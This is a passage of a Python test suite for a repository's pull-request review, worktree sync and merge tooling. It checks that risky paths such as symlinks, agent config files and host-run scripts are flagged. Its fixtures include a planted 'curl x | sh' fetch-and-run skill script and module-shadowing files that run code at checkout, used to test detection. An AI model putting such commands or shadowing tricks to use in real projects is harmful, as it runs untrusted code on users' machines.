        rows = {p: w for _, p, w in self.changes(self.tree_commit({}), self.tree_commit(head, self.tree_commit({})))}
        self.assertEqual(rows, {**{p: 'symlink' for p in O_HOST_RUN}, '.claude/x': 'submodule'})
        block =lambda intro, body, tail='Tail\n': f'{intro}{BEGIN}\n{body}\n{END}\n{tail}'
        p0 = block('Intro\n', 'A')
        for head_text, why in ((block('Intro\n', 'B'), ''), (block('Intro 2\n', 'A'), 'outside library code'),
                               (block('Intro 2\n', 'B'), 'outside library code'), (block('Intro\n', 'A', 'Tail 2\n'), 'outside library code'),
                               ('Intro\nB\nTail\n', 'outside library code'), (block('Intro\n', 'A\n\nmore rows'), ''), (None, 'outside library code')):
            head = {'01-prompts.md': ('100644', head_text)} if head_text is not None else {'x/y': ('100644', 'k')}
            self.check({'01-prompts.md': ('100644', p0)}, head, (p0, head_text or ''), case=head_text)
            got = [r for r in self.changes(self.tree_commit({'01-prompts.md': ('100644', p0)}),
                                           self.tree_commit(head, self.tree_commit({'01-prompts.md': ('100644', p0)}))) if r[1] == '01-prompts.md']
            self.assertEqual(got[0][2], why, head_text)
        self.check({}, {'01-prompts.md': ('100644', block('', 'A'))}, ('', block('', 'A')))
        self.check({'01-prompts.md': ('100644', 'no markers\n')}, {'01-prompts.md': ('100644', 'no markers 2\n')}, ('no markers\n', 'no markers 2\n'))
        self.check({'01-prompts.md': ('100644', p0)}, {'01-prompts.md': ('120000', p0)}, (p0, p0))

    def test_classify_random(self):
        rng = random.Random(f'{SEED}-classify')
        tops = ['01-Core', '02-Data Structures', '07-Strings', '08-Python', '09-Contest Testing', '00-Guidelines', '96-Local Testing',
                '97-Online Testing', '98-Team Notebook', 'OLD', '.claude', '01-', '0a-x', '10-x', 'x', '05-Mathematics', '95-Resources']
        whole = sorted(O_HOST_RUN) + ['.claude/settings.json', '.claude/skills/setup-check/x.py', 'AGENTS.md', '01-Core/CLAUDE.md']
        second = {'96-Local Testing': ['01-Core', '05-Mathematics', '00-Tools', '09-x', '00-index.md', '01-run.py', '_00_memory_cap.py', '.claude',
                                       '03-consistency.py', '_00_cpp_test_runner.py'],
                  '98-Team Notebook': ['02-selection.json', 'Articles', 'Articles', '01-notebook.py', '05-dependencies.py', 'x.tex', 'Docs'],
                  '97-Online Testing': ['src', 'Docs', 'expanded', '03-workspace.py'],
                  '00-Guidelines': ['Ledgers', '23-Sweep Ledgers', '13-Plan', '01-principles.md'],
                  '.claude': ['skills', 'agents', 'settings.json']}
        third = {'13-Plan': ['packages.json', 'finish-log.tsv', 'plan.py', 'batches.json']}
        names = ['a.hpp', 'b.md', 'c d.py', 'x', '00-index.md', 'packages.json', 'é.txt', '01-y_tester.py', '.gitignore', 'CLAUDE.md',
                 'CLAUDE.local.md', 'AGENTS.md', 'xCLAUDE.md', 'CLAUDE.mdx', '.hidden']
        modes = ['100644', '100644', '100644', '100755', '120000', '160000']
        for rd in range(rounds(0, 4, 0.5)):
            tree = {}

            def ok(p):
                return all(not q.startswith(p + '/') and not p.startswith(q + '/') and q != p for q in tree)

            def content(mode, tag):
                return f'{rng.randint(1, 9):040x}' if mode == '160000' else tag

            while len(tree) < 40:
                top = rng.choice(tops)
                parts = [top]
                if rng.random() < 0.05:
                    parts = rng.choice(whole).split('/')
                if len(parts) == 1 and rng.random() < 0.7:
                    parts.append(rng.choice(second.get(top, names + ['Docs'])))
                    if parts[-1] in third and rng.random() < 0.8:
                        parts.append(rng.choice(third[parts[-1]]))
                    elif rng.random() < 0.4:
                        parts.append(rng.choice(names + ['sub']))
                if rng.random() < 0.2 and len(parts) < 4:
                    parts.append(rng.choice(names))
                p = '/'.join(parts)
                if ok(p):
                    m = rng.choice(modes)
                    tree[p] = (m, content(m, f'v{rng.randint(0, 2)}'))
            base = dict(tree)
            head = dict(base)
            for p in list(base):
                r = rng.random()
                if r < 0.15:
                    del head[p]
                elif r < 0.45:
                    m = rng.choice(modes) if rng.random() < 0.5 else base[p][0]
                    head[p] = (m, content(m, f'w{rng.randint(0, 2)}'))
            for _ in range(10):
                p = rng.choice(tops) + '/' + rng.choice(names)
                if ok(p):
                    m = rng.choice(modes)
                    tree[p] = head[p] = (m, content(m, 'new'))
            self.check(base, head, round=rd)

    def traced(self, cmd, cwd, root):
        """(executed .py files under root, files under root opened for writing, process) of cmd run with the AUDIT hook."""
        site, log = self.tmp / 'site', self.tmp / f'audit-{len(list(self.tmp.glob("audit-*")))}.log'
        site.mkdir(exist_ok=True)
        (site / 'sitecustomize.py').write_text(AUDIT)
        env = dict(ISOLATED, PYTHONPATH=str(site), PYTHONDONTWRITEBYTECODE='1', PYTHONPYCACHEPREFIX=str(self.tmp / 'pyc'), MT_AUDIT_LOG=str(log),
                   CP_TEST_PREFLIGHT='0')
        r = REAL_RUN(cmd, cwd=cwd, env=env, capture_output=True, text=True, timeout=600)
        ran, wrote, pre = set(), set(), str(root) + '/'
        for line in log.read_text().splitlines():
            kind, path = line.split('\t', 1)
            if path.startswith(pre):
                (wrote if kind == 'write' else ran).add(path[len(pre):])
        return {p for p in ran if p.endswith('.py') and (root / p).is_file()}, wrote, r

    def copy_repo(self):
        """A copy of the real repository's tracked files (without OLD, 95-Resources and 97-Legacy) under the fixture."""
        copy_root = self.tmp / 'copy'
        for f in git(ROOT, 'ls-files', '-z').split('\0'):
            src = ROOT / f
            if f and not f.startswith(('OLD/', '95-Resources/', '97-Legacy/')) and src.is_file() and not src.is_symlink():
                (copy_root / f).parent.mkdir(parents=True, exist_ok=True)
                shutil.copy(src, copy_root / f)
        return copy_root

    def test_host_run_shadow(self):
        """A pull request's module beside a host-run script shadows the standard module it imports (the script's folder is
        sys.path[0]), so it runs on the host at checkout too: 96-Local Testing/hashlib.py under 03-consistency.py (as
        worktree.py's validator_errors runs it) and 00-Guidelines/13-Plan/shutil.py under plan.py render."""
        copy_root = self.copy_repo()
        for rel, cmd in (('96-Local Testing/hashlib.py', ['96-Local Testing/03-consistency.py']), (PLAN_REL + '/shutil.py', [PLAN_REL + '/plan.py', 'render'])):
            write(copy_root, rel, "print('SHADOW RAN')\n")
            ran, _, r = self.traced([sys.executable, str(copy_root / cmd[0]), *cmd[1:]], copy_root, copy_root)
            info = self.info(path=rel, stdout=r.stdout[-300:], ran=sorted(ran))
            self.assertIn(rel, ran, f'{info} the planted module did not run: update the probe')
            self.assertIn('SHADOW RAN', r.stdout, info)
            self.assertFalse(MP.LIBRARY.fullmatch(rel), info)
            self.assertTrue(MP.HOST_RUN.fullmatch(rel), f'{info} HOST_RUN misses a module the host runs, so files tags it only `outside library code`')
            (copy_root / rel).unlink()
        # a sourceless bytecode module shadows too (an unchecked .pyc beside the script, no .py needed)
        rel = '96-Local Testing/hashlib.pyc'
        src = Path(tempfile.mkdtemp(dir='/var/tmp')) / 'hashlib.py'
        src.write_text("print('SHADOW RAN')\n")
        py_compile.compile(str(src), cfile=str(copy_root / rel), doraise=True)
        shutil.rmtree(src.parent)
        r = subprocess.run([sys.executable, str(copy_root / '96-Local Testing/03-consistency.py')], cwd=copy_root, capture_output=True, text=True)
        info = self.info(path=rel, stdout=r.stdout[-300:])
        self.assertIn('SHADOW RAN', r.stdout, f'{info} the planted bytecode did not run: update the probe')
        self.assertTrue(MP.HOST_RUN.fullmatch(rel), f'{info} HOST_RUN misses a bytecode module the host runs')
        (copy_root / rel).unlink()

    def test_host_run_coverage(self):
        """HOST_RUN names every repository .py file 03-consistency.py (run read-only on the real repository) and plan.py rank and
        render (run on a copy of its tracked files) execute; oracle: an audit hook logging every compiled or executed file."""
        ran, wrote, r = self.traced([sys.executable, str(ROOT / '96-Local Testing/03-consistency.py')], '/tmp', ROOT)
        info = self.info(returncode=r.returncode, stderr=r.stderr[-1500:], ran=sorted(ran))
        self.assertNotIn('Traceback', r.stderr, info)
        self.assertIn('"errors"', r.stdout, info)
        self.assertEqual(wrote, set(), info + ' (03-consistency.py wrote into the repository)')
        self.assertIn('96-Local Testing/03-consistency.py', ran, info)
        ran.discard('96-Local Testing/03-consistency.py')
        self.assertTrue(ran, info)
        self.assertEqual(sorted(p for p in ran if not MP.HOST_RUN.fullmatch(p)), [], info)
        copy_root = self.copy_repo()
        for sub in ('rank', 'render'):
            ran, wrote, r = self.traced([sys.executable, str(copy_root / PLAN_REL / 'plan.py'), sub], copy_root, copy_root)
            info = self.info(cmd=sub, returncode=r.returncode, stderr=r.stderr[-1500:], ran=sorted(ran))
            self.assertEqual(r.returncode, 0, info)
            self.assertIn(PLAN_REL + '/plan.py', ran, info)
            self.assertEqual(sorted(p for p in ran if not MP.HOST_RUN.fullmatch(p)), [], info)


class Sync(Base):
    """worktree.py --sync on a synthetic main checkout with the real plan and a linked worktree branch `wsync`."""

    def setUp(self):
        super().setUp()
        self.main = make_repo(self.tmp / 'main', real=True)
        self.wt = add_worktree(self.main, 'WSYNC', 'wsync')
        self.base = packages(self.main)
        self.bmap = {p['id']: p for p in self.base['packages']}

    def runs(self, k, rng=None):
        """k consecutive planned packages of one phase with empty notes, after at least three planned ones of the phase
        (so a package that `plan.py set` starts moves past them and git sees the move)."""
        pl = self.base['packages']
        starts = [i for i in range(3, len(pl) - k + 1)
                  if all(p['status'] == 'planned' and not p['note'] and p['phase'] == pl[i]['phase'] for p in pl[i - 3:i + k])]
        self.assertTrue(starts, 'the real plan has no run of planned packages to edit')
        i = (rng or random.Random(SEED)).choice(starts)
        return [p['id'] for p in pl[i:i + k]]

    def plan_set(self, root, pid, status, note):
        plan_cmd(root, 'set', pid, status, '--note', note)

    def json_notes(self, root, notes):
        pk = packages(root)
        for p in pk['packages']:
            if p['id'] in notes:
                p['note'] = notes[p['id']]
        save_packages(root, pk)
        plan_cmd(root, 'render')

    def conflicts(self):
        r = git(self.main, 'merge-tree', '--write-tree', '--name-only', 'master', 'wsync', check=False)
        files = r.stdout.split('\n\n')[0].splitlines()[1:]
        return r.returncode, files

    def sync(self):
        return REAL_RUN([sys.executable, str(self.main / PLAN_REL / 'worktree.py'), str(self.wt), '--sync'], cwd=self.main,
                        capture_output=True, text=True, env=ISOLATED, timeout=600)

    def no_rebase(self):
        for d in ('rebase-merge', 'rebase-apply'):
            p = Path(git(self.wt, 'rev-parse', '--path-format=absolute', '--git-path', d))
            self.assertFalse(p.exists(), f'{p} left behind')

    def expect_ok(self, r, want, conflicted, commits=1, **kw):
        info = self.info(stdout=r.stdout, stderr=r.stderr, **kw)
        self.assertIn('sync     rebase done', r.stdout, info)
        self.assertNotIn('rebase stopped', r.stderr, info)
        self.no_rebase()
        self.assertEqual(git(self.wt, 'rev-parse', f'HEAD~{commits}'), git(self.main, 'rev-parse', 'master'), info)
        self.assertEqual(git(self.wt, 'status', '--porcelain'), '', info)
        pk = packages(self.wt)
        got = {p['id']: p for p in pk['packages']}
        exp = {p['id']: p for p in want['packages']}
        self.assertEqual(sorted(got), sorted(exp), info)
        for i in exp:
            self.assertEqual(got[i], exp[i], f'{info} entry {i}')
        self.assertEqual({k: v for k, v in pk.items() if k != 'packages'}, {k: v for k, v in want.items() if k != 'packages'}, info)
        if conflicted:  # merged entry by entry, then ranked
            again = copy.deepcopy(pk)
            PLAN.rank(PLAN.load(self.wt)[0], again)
            self.assertEqual([p['id'] for p in again['packages']], [p['id'] for p in pk['packages']], f'{info} not in rank order')
        self.assertEqual((self.wt / '01-prompts.md').read_text(), PLAN.rendered_file(self.wt, pk), f'{info} plan block is not plan.py render')

    def expect_abort(self, r, lines, head, **kw):
        info = self.info(stdout=r.stdout, stderr=r.stderr, **kw)
        self.assertNotEqual(r.returncode, 0, info)
        self.assertIn('rebase stopped on conflicts outside the generated plan block and packages.json entries; aborted', r.stderr, info)
        listed = [l.strip() for l in r.stderr.split('Resolve by hand in the worktree:', 1)[-1].splitlines() if l.strip()]
        if lines is not None:
            self.assertEqual(sorted(listed), sorted(lines), info)
        self.assertEqual(git(self.wt, 'rev-parse', 'HEAD'), head, info)
        self.assertEqual(git(self.wt, 'branch', '--show-current'), 'wsync', info)
        self.assertEqual(git(self.wt, 'status', '--porcelain'), '', info)
        self.no_rebase()
        return listed

    def edited(self, edits):
        want = copy.deepcopy(self.base)
        for p in want['packages']:
            p.update(edits.get(p['id'], {}))
        return want

    def test_sync_packages_conflict(self):
        pa, pb = self.runs(2)
        self.plan_set(self.main, pa, 'in-progress', 'master note')
        commit(self.main, 'master: ' + pa)
        self.plan_set(self.wt, pb, 'in-progress', 'branch note')
        commit(self.wt, 'branch: ' + pb)
        rc, files = self.conflicts()
        self.assertIn(PJ, files, self.info(note='scenario does not conflict in packages.json', files=files))
        self.expect_ok(self.sync(), self.edited({pa: {'status': 'in-progress', 'note': 'master note'},
                                                 pb: {'status': 'in-progress', 'note': 'branch note'}}), True, packages=(pa, pb))

    def test_sync_same_field_clash(self):
        pa, = self.runs(1)
        self.plan_set(self.main, pa, 'in-progress', 'master note')
        commit(self.main, 'master')
        self.plan_set(self.wt, pa, 'in-progress', 'branch note')
        head = commit(self.wt, 'branch')
        master = git(self.main, 'rev-parse', 'master')
        self.expect_abort(self.sync(), [f'packages.json.packages[{pa}].note'], head, package=pa)
        self.assertEqual(git(self.main, 'rev-parse', 'master'), master)
        self.assertEqual(next(p for p in packages(self.wt)['packages'] if p['id'] == pa)['note'], 'branch note')

    def test_sync_other_file_conflict(self):
        write(self.main, 'notes.txt', 'master 1\nline 2\n')
        commit(self.main, 'master')
        write(self.wt, 'notes.txt', 'branch 1\nline 2\n')
        head = commit(self.wt, 'branch')
        self.expect_abort(self.sync(), ['notes.txt'], head)
        pa, pb = self.runs(2)  # a packages.json conflict beside it does not rescue the rebase
        self.plan_set(self.main, pa, 'in-progress', 'm')
        commit(self.main, 'master 2')
        self.plan_set(self.wt, pb, 'in-progress', 'b')
        head = commit(self.wt, 'branch 2')
        listed = self.expect_abort(self.sync(), None, head)
        self.assertIn('notes.txt', listed)

    def test_sync_prompts_only(self):
        pa, pb = self.runs(2)
        self.json_notes(self.main, {pa: 'master note'})
        commit(self.main, 'master')
        self.json_notes(self.wt, {pb: 'branch note'})
        commit(self.wt, 'branch')
        rc, files = self.conflicts()
        self.assertEqual(files, ['01-prompts.md'], self.info(note='scenario must conflict only in 01-prompts.md'))
        self.expect_ok(self.sync(), self.edited({pa: {'note': 'master note'}, pb: {'note': 'branch note'}}), False)

    def test_sync_prompts_outside_block(self):
        text = (self.main / '01-prompts.md').read_text()
        write(self.main, '01-prompts.md', 'master intro\n' + text)
        commit(self.main, 'master')
        write(self.wt, '01-prompts.md', 'branch intro\n' + text)
        head = commit(self.wt, 'branch')
        self.expect_abort(self.sync(), ['01-prompts.md'], head)

    def test_sync_plan_deleted(self):
        pa, = self.runs(1)
        self.plan_set(self.main, pa, 'in-progress', 'm')
        commit(self.main, 'master')
        (self.wt / PJ).unlink()
        head = commit(self.wt, 'branch deletes the plan')
        self.expect_abort(self.sync(), [f'{PJ} (added or deleted on one side)'], head)

    def test_sync_plan_not_json(self):
        pa, = self.runs(1)
        self.plan_set(self.main, pa, 'in-progress', 'm')
        commit(self.main, 'master')
        write(self.wt, PJ, 'not json\n')
        head = commit(self.wt, 'branch breaks the plan')
        self.expect_abort(self.sync(), [f'{PJ} (a side is not JSON)'], head)

    def test_sync_resolver_fails(self):
        """A failing plan.py rank (packages.json conflict) or render (plan block conflict) in the conflict loop aborts the
        rebase and re-raises: no rebase in progress, the branch head unchanged."""
        for cmd in ('rank', 'render'):
            with self.subTest(cmd=cmd):
                if cmd == 'render':
                    self.tearDown_round()
                pa, pb = self.runs(2)
                if cmd == 'rank':
                    self.plan_set(self.main, pa, 'in-progress', 'm')
                else:
                    self.json_notes(self.main, {pa: 'm'})
                commit(self.main, 'master')
                if cmd == 'rank':
                    self.plan_set(self.wt, pb, 'in-progress', 'b')
                else:
                    self.json_notes(self.wt, {pb: 'b'})
                plan_py = self.wt / PLAN_REL / 'plan.py'
                plan_py.write_text(f'import sys\nif sys.argv[1:2] == [{cmd!r}]:\n    sys.exit(1)\n' + plan_py.read_text())
                head = commit(self.wt, 'branch breaks plan.py ' + cmd)
                rc, files = self.conflicts()
                self.assertIn(PJ if cmd == 'rank' else '01-prompts.md', files, self.info(files=files))
                r = self.sync()
                info = self.info(cmd=cmd, stdout=r.stdout, stderr=r.stderr)
                self.assertNotEqual(r.returncode, 0, info)
                self.assertIn('CalledProcessError', r.stderr, info)
                self.assertNotIn('rebase done', r.stdout, info)
                self.assertEqual(git(self.wt, 'rev-parse', 'HEAD'), head, info)
                self.assertEqual(git(self.wt, 'branch', '--show-current'), 'wsync', info)
                self.assertEqual(git(self.wt, 'status', '--porcelain'), '', info)
                self.no_rebase()

    def test_sync_two_commits(self):
        pa, pb, pc = self.runs(3)
        self.plan_set(self.main, pa, 'in-progress', 'm')
        commit(self.main, 'master')
        self.plan_set(self.wt, pb, 'in-progress', 'b1')
        commit(self.wt, 'branch 1')
        self.plan_set(self.wt, pc, 'in-progress', 'b2')
        commit(self.wt, 'branch 2')
        self.expect_ok(self.sync(), self.edited({pa: {'status': 'in-progress', 'note': 'm'}, pb: {'status': 'in-progress', 'note': 'b1'},
                                                 pc: {'status': 'in-progress', 'note': 'b2'}}), True, commits=2)

    def test_sync_random(self):
        rng = random.Random(f'{SEED}-sync')
        for rd in range(rounds(0, 2, 0.25)):
            if rd:
                self.tearDown_round()
            planned = [p['id'] for p in self.base['packages'] if p['status'] == 'planned' and not p['note']]
            chosen = rng.sample(planned, 6)
            sides, edits = {'m': {}, 'b': {}}, {}
            for k, pid in enumerate(chosen):
                side = 'mb'[k % 2]
                kind = rng.choice(['set', 'note'])
                sides[side][pid] = (kind, f'{side} note {k}')
                edits[pid] = {'note': f'{side} note {k}', **({'status': 'in-progress'} if kind == 'set' else {})}
            clash = rng.random() < 0.3 and next(p for p in planned if p not in chosen)
            if clash:
                sides['m'][clash], sides['b'][clash] = ('note', 'm clash'), ('note', 'b clash')
            for side, root in (('m', self.main), ('b', self.wt)):
                notes = {pid: v for pid, (kind, v) in sides[side].items() if kind == 'note'}
                if notes:
                    self.json_notes(root, notes)
                for pid, (kind, v) in sides[side].items():
                    if kind == 'set':
                        self.plan_set(root, pid, 'in-progress', v)
                head = commit(root, side)
            rc, files = self.conflicts()
            r = self.sync()
            if clash:
                self.expect_abort(r, [f'packages.json.packages[{clash}].note'], head, round=rd, sides=sides)
            else:
                self.expect_ok(r, self.edited(edits), PJ in files, round=rd, sides=sides, conflicts=files)

    def tearDown_round(self):
        """A fresh repository for the next random round."""
        git(self.main, 'worktree', 'remove', '--force', str(self.wt))
        shutil.rmtree(self.main)
        self.main = make_repo(self.main, real=True)
        self.wt = add_worktree(self.main, 'WSYNC', 'wsync')


class MergePR(Base):
    """files, checkout, land and drop of a copied merge_pr.py on a synthetic main checkout with the mini plan."""

    def fixture(self, branch='P250-SUP19-bob', pr_files=None, n=7, master_files=None):
        self.main = make_repo(self.tmp / 'main')
        self.fork = git(self.main, 'rev-parse', 'master')
        git(self.main, 'checkout', '-q', '-b', 'tmp-pr')
        for rel, text in (pr_files or {'01-Core/01-x.hpp': '#pragma once\n'}).items():
            if isinstance(text, tuple):  # ('link', target)
                (self.main / rel).parent.mkdir(parents=True, exist_ok=True)
                os.symlink(text[1], self.main / rel)
            else:
                write(self.main, rel, text)
            if rel == PJ:
                plan_cmd(self.main, 'render')
        commit(self.main, 'pr 1')
        write(self.main, '01-Core/Docs/01-x.md', 'evidence\n')
        self.head = commit(self.main, 'pr 2')
        self.pr_paths = git(self.main, 'diff', '--name-only', self.fork, self.head).splitlines()
        git(self.main, 'checkout', '-q', 'master')
        for rel, text in (master_files or {'master.txt': 'master moved\n'}).items():
            write(self.main, rel, text)
        commit(self.main, 'master moves')
        self.bare = self.tmp / 'remote' / (REPO + '.git')
        self.bare.mkdir(parents=True)
        git(self.bare, 'init', '-q', '--bare')
        git(self.main, 'push', '-q', str(self.bare), f'tmp-pr:refs/pull/{n}/head')
        git(self.main, 'branch', '-q', '-D', 'tmp-pr')
        self.view(headRefName=branch)

    def view(self, **kw):
        pr = {'number': 7, 'title': 'Add x', 'state': 'OPEN', 'isDraft': False, 'baseRefName': 'master', 'headRefName': 'P250-SUP19-bob',
              'headRefOid': self.head, 'author': {'login': 'bob'}} | kw
        (self.fake / 'view.out').write_text(json.dumps(pr))

    def remote_refs(self):
        return git(self.bare, 'for-each-ref')

    def test_files_requires_maintainer(self):
        self.fixture()
        for role in ('contributor', None):
            r = self.mp('files', 7, role=role)
            self.assertNotEqual(r.returncode, 0)
            self.assertIn('/merge-pr is for the maintainer (git config compprog.role maintainer)', r.stderr, r.stderr)
            self.assertEqual(self.calls(), [])
            self.assertFalse(self.state_file().exists())

    def test_files_refuses_linked_worktree(self):
        self.fixture()
        wt = add_worktree(self.main, 'W1', 'w1')
        r = self.mp('files', 7, script=wt / MERGE_REL)
        self.assertIn('run /merge-pr from the main checkout, not a worktree', r.stderr, r.stderr)
        self.assertNotEqual(r.returncode, 0)
        self.assertEqual(self.calls(), [])

    def test_files_stops(self):
        self.fixture()
        for kw, msg in (({'isDraft': True}, 'STOP: #7 is a draft, so its package is not done'),
                        ({'state': 'CLOSED'}, 'STOP: #7 is closed against master; only open pull requests into master land'),
                        ({'state': 'MERGED'}, 'STOP: #7 is merged against master'),
                        ({'baseRefName': 'develop'}, 'STOP: #7 is open against develop; only open pull requests into master land'),
                        ({'baseRefName': 'develop', 'isDraft': True}, 'STOP: #7 is open against develop')):
            self.view(**kw)
            r = self.mp('files', 7)
            self.assertNotEqual(r.returncode, 0, kw)
            self.assertIn(msg, r.stderr, f'{kw} {r.stderr}')
            self.assertFalse(self.state_file().exists(), kw)
            self.assertEqual(git(self.main, 'for-each-ref', 'refs/merge-pr'), '', kw)
        (self.fake / 'view.fail').write_text('HTTP 404: Not Found\nmore\n')
        r = self.mp('files', 7)
        self.assertIn('gh pr view 7: HTTP 404: Not Found', r.stderr)
        self.assertNotIn('more', r.stderr)

    def test_files_moved(self):
        self.fixture()
        self.view(headRefOid='f' * 40)
        r = self.mp('files', 7)
        self.assertIn('#7 moved while it was fetched; rerun', r.stderr, r.stderr)
        self.assertNotEqual(r.returncode, 0)
        self.assertFalse(self.state_file().exists())

    def expect_files(self, r, branch, package, model, batch):
        info = self.info(stdout=r.stdout, stderr=r.stderr)
        self.assertEqual(r.returncode, 0, info)
        core = [p for p in self.pr_paths if o_core_full(p)]  # pr_paths is git's sorted order
        reviewer = 'fable' if core else model
        st = json.loads(self.state_file().read_text())
        self.assertEqual(st, {'repo': REPO, 'head': self.head, 'base': self.fork, 'branch': branch, 'package': package, 'model': reviewer,
                              'worktree': str(self.main / '.claude/worktrees/PR7')}, info)
        self.assertEqual(git(self.main, 'rev-parse', 'refs/merge-pr/7'), self.head)
        call = self.calls()
        self.assertEqual(call, [['pr', 'view', '7', '--repo', REPO, '--json',
                                 'number,title,state,isDraft,baseRefName,headRefName,headRefOid,author']], info)
        trees = [{p: self.tree_entry(rev, p) for p in self.pr_paths if self.tree_entry(rev, p)} for rev in (self.fork, self.head)]
        prompts = [git(self.main, 'show', f'{rev}:01-prompts.md', check=False).stdout for rev in (self.fork, self.head)]
        rows = o_rows(*trees, prompts)
        lines = r.stdout.splitlines()
        what = f'package {package} ({model}), batch {batch}' if package else 'not a claim branch, so no package'
        folders = {}
        for _, p, w in rows:
            if not w:
                folders[p.split('/')[0]] = folders.get(p.split('/')[0], 0) + 1
        outside = [f'  OUTSIDE {s} {p} ({w})' for s, p, w in rows if w]
        want = [f'#7 "Add x" by @bob on {self.branch_name}: {what}',
                f'head {self.head[:12]}, 2 commit(s) on merge base {self.fork[:12]}; {len(rows)} path(s) changed; reviewer model {reviewer or "default"}',
                *([f'CORE FULL: {", ".join(core)}; Core full packages are maintainer-only, so a contributor\'s change to them needs the user\'s yes']
                  if core else []), *outside,
                '  library: ' + (', '.join(f'{f} {k}' for f, k in sorted(folders.items())) or 'none'),
                f'OUTSIDE LIBRARY: {len(outside)} of {len(rows)} paths; the user must say yes before checkout' if outside else 'all paths are library code']
        dec = o_decisions(self.pr_paths, *trees)
        if dec:
            want += [f'DECISIONS: {len(dec)} added line(s) record a decision; the user confirms each is theirs before checkout',
                     *(f'  {path}:{n}: {text.strip()[:200]}' for path, n, text in dec)]
        self.assertEqual(lines, want, info)
        self.decisions = dec
        return outside

    def tree_entry(self, rev, path):
        out = git(self.main, 'ls-tree', '-z', rev, '--', path).rstrip('\0')
        if not out:
            return None
        meta, _ = out.split('\t', 1)
        mode, kind, sha = meta.split()
        return mode, git(self.main, 'cat-file', 'blob', sha) if kind == 'blob' else sha

    def test_files_claim(self):
        pk = copy.deepcopy(MINI_PACKAGES)
        pk['packages'][0]['note'] = 'contributor note'
        self.branch_name = 'P250-SUP19-bob'
        self.fixture(self.branch_name, {'01-Core/01-x.hpp': '#pragma once\n', X_TESTER: gate_stub('x', 'changed'),
                                        PJ: json.dumps(pk, indent=2) + '\n', '.claude/skills/evil/run.sh': 'curl x | sh\n', 'CLAUDE.md': 'x\n',
                                        '02-Data Structures/link': ('link', '../notes.txt'), '96-Local Testing/00-Tools/x_tester.py': 'x\n'})
        outside = self.expect_files(self.mp('files', 7), 'P250-SUP19-bob', 'P250', 'opus', 'SUP19')
        self.assertEqual(outside, ['  OUTSIDE A .claude/skills/evil/run.sh (outside library code; loaded by Claude Code)', '  OUTSIDE A 02-Data Structures/link (symlink)',
                                   '  OUTSIDE A 96-Local Testing/00-Tools/x_tester.py (outside library code)',
                                   '  OUTSIDE A CLAUDE.md (outside library code; loaded by Claude Code)'])
        self.branch_name = 'P001-c01-carol'  # batch case-insensitive; the fable package's model is recorded
        self.view(headRefName=self.branch_name)
        self.expect_files(self.mp('files', 7), 'P001-c01-carol', 'P001', 'fable', 'C01')

    def test_files_core_full(self):
        """A changed 01-Core/NN-*.hpp without `mini` makes the reviewer model fable whatever the package."""
        for branch, files, package, model, batch in (
                ('P250-SUP19-bob', {'01-Core/05-y.hpp': 'y\n', '01-Core/06-zmini.hpp': 'z\n'}, 'P250', 'opus', 'SUP19'),
                ('P030-DS01-bob', {'01-Core/06-zmini.hpp': 'z\n', '01-Core/Docs/05-y.md': 'd\n', '01-Core/x.hpp': 'x\n',
                                   '02-Data Structures/01-d.hpp': 'd\n', '01-Core/sub/07-w.hpp': 'w\n'}, 'P030', 'opus', 'DS01'),
                ('feature/core', {'01-Core/09-rational.hpp': 'r\n'}, None, None, None),
                ('feature/ds', {'02-Data Structures/01-d.hpp': 'd\n'}, None, None, None)):
            with self.subTest(branch=branch):
                if hasattr(self, 'main'):
                    shutil.rmtree(self.tmp / 'main')
                    shutil.rmtree(self.tmp / 'remote')
                self.branch_name = branch
                self.fixture(branch, files)
                self.expect_files(self.mp('files', 7), branch if package else 'pr-7', package, model, batch)

    def test_files_decisions(self):
        notes = ('plain\n- user decision 2026-11-06: keep x\n- kept (user, 2026-11-06)\n- renamed (decided 2026-11-06)\n'
                 'Decided by the user: w\nthe user wants it, and we decided later\na decision was made\n\n'
                 '- ' + 'x' * 260 + ' user decided\n')
        ledger = ('# Omissions\n\n## Recorded decisions\n\nDecided by whom Priority names.\n\n### Keeps\n\n- 2026-11-06, x: bob\n\n'
                  '## Candidates\n\n- 2026-11-06, y: candidate\n')
        self.branch_name = 'P250-SUP19-bob'
        self.fixture(self.branch_name, {'02-Data Structures/Docs/00-notes.md': notes, '00-Guidelines/23-Sweep Ledgers/omissions.md': ledger,
                                        'notes.txt': 'line 1\nline 2, user decision 2026-11-06\nline 3\n', '01-Core/01-x.hpp': '#pragma once\n'})
        self.expect_files(self.mp('files', 7), 'P250-SUP19-bob', 'P250', 'opus', 'SUP19')
        self.assertEqual([(p, n) for p, n, _ in self.decisions],
                         [('00-Guidelines/23-Sweep Ledgers/omissions.md', 5), ('00-Guidelines/23-Sweep Ledgers/omissions.md', 9),
                          ('02-Data Structures/Docs/00-notes.md', 2), ('02-Data Structures/Docs/00-notes.md', 3),
                          ('02-Data Structures/Docs/00-notes.md', 4), ('02-Data Structures/Docs/00-notes.md', 5),
                          ('02-Data Structures/Docs/00-notes.md', 6), ('02-Data Structures/Docs/00-notes.md', 9), ('notes.txt', 2)])
        self.assertTrue(o_decision('user decision') and not o_decision('a decision was made') and not o_decision('user ' + 'y' * 41 + ' decided'))

    def test_files_not_claim(self):
        for branch in ('feature/x', 'P250-C01-bob', 'P999-SUP19-bob', 'P250-SUP19-'):
            with self.subTest(branch=branch):
                if hasattr(self, 'main'):
                    shutil.rmtree(self.tmp / 'main')
                    shutil.rmtree(self.tmp / 'remote')
                self.branch_name = branch
                self.fixture(branch)
                outside = self.expect_files(self.mp('files', 7), 'pr-7', None, None, None)
                self.assertEqual(outside, [])

    def test_checkout_land(self):
        self.branch_name = 'P250-SUP19-bob'
        self.fixture(self.branch_name)
        self.assertEqual(self.mp('files', 7).returncode, 0)
        self.calls()
        before = self.remote_refs()
        r = self.mp('checkout', 7, full_path=True)
        wt = self.main / '.claude/worktrees/PR7'
        info = self.info(stdout=r.stdout, stderr=r.stderr)
        self.assertTrue(wt.is_dir(), info)
        self.assertIn('sync     rebase done', r.stdout, info)
        self.assertEqual(git(wt, 'branch', '--show-current'), self.branch_name, info)
        master = git(self.main, 'rev-parse', 'master')
        self.assertEqual(git(wt, 'rev-parse', 'HEAD~2'), master, info)
        self.assertEqual(sorted(git(wt, 'diff', '--name-only', 'master', 'HEAD').splitlines()), sorted(self.pr_paths), info)
        self.assertEqual(git(wt, 'status', '--porcelain'), '', info)
        head = git(wt, 'rev-parse', 'HEAD')
        st = json.loads(self.state_file().read_text())
        self.assertIs(st.get('created'), True, info)
        self.calls()
        r = self.mp('files', 7)
        self.assertNotEqual(r.returncode, 0, r.stdout)
